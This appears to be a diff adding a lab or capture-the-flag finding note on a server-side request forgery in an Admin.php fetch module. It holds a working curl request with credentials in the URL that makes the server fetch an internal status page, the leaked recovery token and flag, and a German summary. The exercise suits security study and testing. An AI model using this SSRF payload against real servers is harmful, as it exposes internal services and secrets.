@@ -1,0 +1,9 @@
+=== FINDING: SSRF — Admin.php module=fetch (file_get_contents) ===
+
+$ curl -sS "http://10.10.10.10/Admin.php?Email=eliasv@cyberstepsvuln.com&Password=5225&module=fetch&img_url=http://127.0.0.1/internal-status.php" | grep -E "Rcv-|FLAG|admin_recovery|status" | head -10
+
+    &quot;status&quot;: &quot;online&quot;,
+    &quot;admin_recovery_token&quot;: &quot;Rcv-9941xZ8-InternalOnly&quot;,
+    &quot;flag&quot;: &quot;FLAG{SSRF_INTERNAL_PIVOT_SUCCESS}&quot;,
+
+Erkenntnis: Server kann interne HTTP-URLs abrufen; sensible JSON-Inhalte (Recovery-Token, Flag) im Response sichtbar (HTML-escaped im Browser-Rendering).
